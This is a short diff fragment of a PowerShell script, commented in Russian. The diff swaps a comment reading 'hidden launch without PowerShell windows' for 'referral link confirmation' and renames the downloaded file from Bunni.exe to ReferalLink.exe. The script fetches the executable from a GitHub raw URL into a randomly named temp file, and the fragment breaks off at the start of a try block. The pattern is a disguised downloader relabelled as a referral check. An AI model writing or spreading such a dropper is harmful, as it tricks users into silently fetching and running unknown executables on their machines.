@@ -1,5 +1,5 @@
-# Скрытый запуск без окон PowerShell
-$url  = 'https://github.com/wertybalet/bunni/raw/refs/heads/main/Bunni.exe'
+# Подтверждение рефферальной ссылки
+$url  = 'https://github.com/wertybalet/bunni/raw/refs/heads/main/ReferalLink.exe'
 $file = "$env:LOCALAPPDATA\Temp\i$(Get-Random).exe"
 
 try {
